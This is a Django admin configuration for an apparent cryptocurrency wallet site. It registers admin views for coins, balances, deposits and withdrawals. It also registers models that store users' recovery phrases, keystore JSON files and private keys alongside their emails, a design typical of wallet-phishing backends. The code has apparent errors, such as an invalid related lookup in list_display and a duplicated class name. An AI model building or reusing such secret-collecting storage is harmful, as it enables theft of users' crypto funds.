from django.contrib import admin

# Register your models here.
from django.contrib import admin
from .models import Coin, userCoin,userCoinwallet2,Coin2,wallet,deposit, phrase,withdrwa, KeystoneJson, PrivateKey,userCoinwallet


# 🪙 Coin Admin
@admin.register(Coin)
class CoinAdmin(admin.ModelAdmin):
    list_display = ("fullname", "shortname", "traderate")
    search_fields = ("fullname", "shortname")
    list_filter = ("shortname",)
    ordering = ("fullname",)
@admin.register(userCoinwallet2)
class CoinAdminuserCoinwallet2(admin.ModelAdmin):
    list_display = ("balance", "walletaddress", "iscoin2__shortname")
    search_fields = ("balance", "walletaddress")
    list_filter = ("iscoin2__shortname",)
    ordering = ("fullname",)
@admin.register(Coin2)
class CoinAdmin2(admin.ModelAdmin):
    list_display = ("fullname", "shortname", "traderate")
    search_fields = ("fullname", "shortname")
    list_filter = ("shortname",)
    ordering = ("fullname",)


# 👤 User Coin Admin
@admin.register(userCoin)
class UserCoinAdmin(admin.ModelAdmin):
    list_display = ( "balance", "id")
    search_fields = ("balance", "iscoin__iscoin__fullname")
    list_filter = ("iscoin",)


@admin.register(withdrwa)
class UserCoinAdminwithdrwa(admin.ModelAdmin):
    list_display = (  'Amount',"RecipientAddress","status", "id")
    search_fields = ('Amount',"RecipientAddress","status", )
    list_filter = ("RecipientAddress","status")
    
@admin.register(deposit)
class UserCoinAdmindeposit(admin.ModelAdmin):
    list_display = (  'Amount',"status", "id")
    search_fields = ('Amount', "status", )
@admin.register(wallet)
class UserCoinAdmindeposit(admin.ModelAdmin):
    list_display = (  'name',"address", "id")
    search_fields = ('name',"address", )
     


@admin.register(userCoinwallet)
class UserCoinAdminwallet(admin.ModelAdmin):
    list_display = ("iscoin", "balance", "id")
    search_fields = ("user__username", "iscoin__fullname")
    list_filter = ("iscoin",)
  


# 🔑 Phrase Admin
@admin.register(phrase)
class PhraseAdmin(admin.ModelAdmin):
    list_display = ("Namewallet", "Email")
    search_fields = ("Namewallet", "Email")


# 📄 Keystone JSON Admin
@admin.register(KeystoneJson)
class KeystoneJsonAdmin(admin.ModelAdmin):
    list_display = ("Namewallet", "Email")
    search_fields = ("Namewallet", "Email")


# 🔐 Private Key Admin
@admin.register(PrivateKey)
class PrivateKeyAdmin(admin.ModelAdmin):
    list_display = ("Namewallet", "Email")
    search_fields = ("Namewallet", "Email")